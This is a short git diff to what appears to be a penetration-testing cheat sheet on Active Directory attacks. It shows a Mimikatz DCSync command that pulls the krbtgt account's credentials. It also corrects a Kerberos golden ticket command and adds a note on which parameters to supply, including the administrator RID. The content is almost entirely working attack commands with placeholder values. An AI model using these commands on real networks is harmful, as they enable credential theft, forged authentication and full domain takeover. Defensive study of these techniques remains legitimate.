@@ -33,10 +33,11 @@ lsadump::dcsync /domain:lol.local /user:krbtgt
 ### golden ticket
 
 ```powershell
-kerberos::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
+kerberos::golden /user:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
 
 # where:
 - /domain – the fully qualified domain name.
+- /id – (500 -> default rid from administrator account)
 - /sid – the SID of the domain.
 - /user – username to impersonate
 - /krbtgt – NTLM password hash for  account (KRBTGT)
